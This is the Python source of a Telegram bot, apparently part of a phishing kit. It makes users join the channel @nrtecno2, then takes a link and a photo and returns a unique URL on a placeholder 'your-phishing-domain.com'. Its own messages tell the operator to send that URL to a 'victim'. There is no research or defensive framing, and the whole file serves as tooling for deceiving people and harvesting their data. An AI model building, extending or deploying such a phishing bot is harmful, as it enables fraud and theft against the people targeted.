import asyncio
import logging
import sqlite3
import hashlib
import time
import requests
from aiogram import Bot, Dispatcher, types
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.contrib.middlewares.logging import LoggingMiddleware
from aiogram.utils import executor

BOT_TOKEN = "YOUR_BOT_TOKEN"  # Change later
CHANNEL_USERNAME = "@nrtecno2"
ADMIN_ID = 123456789  # Change to your Telegram ID

# Database
conn = sqlite3.connect('shared/database.db')
c = conn.cursor()
c.execute('''CREATE TABLE IF NOT EXISTS users
             (user_id INTEGER PRIMARY KEY, username TEXT, link TEXT, photo_id TEXT, unique_code TEXT)''')
conn.commit()

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(bot)
dp.middleware.setup(LoggingMiddleware())

async def check_subscription(user_id):
    try:
        member = await bot.get_chat_member(chat_id=CHANNEL_USERNAME, user_id=user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False

def generate_unique_link(user_id):
    raw = f"{user_id}_{time.time()}"
    return hashlib.md5(raw.encode()).hexdigest()[:10]

@dp.message_handler(commands=['start'])
async def start_command(message: types.Message):
    user_id = message.from_user.id
    is_subscribed = await check_subscription(user_id)
    
    if not is_subscribed:
        keyboard = InlineKeyboardMarkup(row_width=1)
        keyboard.add(
            InlineKeyboardButton("📢 Join Channel", url="https://t.me/nrtecno2"),
            InlineKeyboardButton("✅ Verify", callback_data="verify_sub")
        )
        await message.reply(
            "⚠️ *Access Denied!*\n\nYou must join @nrtecno2 first.\n👇 Click below to join & verify.",
            reply_markup=keyboard,
            parse_mode="Markdown"
        )
    else:
        await message.reply("✅ *Verified!*\n\nSend me the **link** you want to share with victim.", parse_mode="Markdown")
        c.execute("INSERT OR REPLACE INTO users (user_id, username) VALUES (?, ?)",
                  (user_id, message.from_user.username))
        conn.commit()

@dp.callback_query_handler(lambda c: c.data == "verify_sub")
async def verify_subscription(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    is_subscribed = await check_subscription(user_id)
    
    if is_subscribed:
        await callback.message.edit_text("✅ *Verified!*\n\nNow send me the **link** you want to share.", parse_mode="Markdown")
        c.execute("INSERT OR REPLACE INTO users (user_id) VALUES (?)", (user_id,))
        conn.commit()
    else:
        await callback.answer("❌ You haven't joined yet!", show_alert=True)

@dp.message_handler(lambda msg: msg.text and msg.text.startswith('http'))
async def handle_link(message: types.Message):
    user_id = message.from_user.id
    link = message.text
    c.execute("UPDATE users SET link = ? WHERE user_id = ?", (link, user_id))
    conn.commit()
    await message.reply("📸 *Photo Required!*\n\nNow send a **photo** to show victim.", parse_mode="Markdown")

@dp.message_handler(content_types=['photo'])
async def handle_photo(message: types.Message):
    user_id = message.from_user.id
    photo_id = message.photo[-1].file_id
    unique_code = generate_unique_link(user_id)
    
    c.execute("UPDATE users SET photo_id = ?, unique_code = ? WHERE user_id = ?",
              (photo_id, unique_code, user_id))
    conn.commit()
    
    phishing_link = f"https://your-phishing-domain.com/{unique_code}"
    await message.reply(
        f"✅ *Link Generated!*\n\n🔗 `{phishing_link}`\n\nSend this to victim.",
        parse_mode="Markdown"
    )

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)
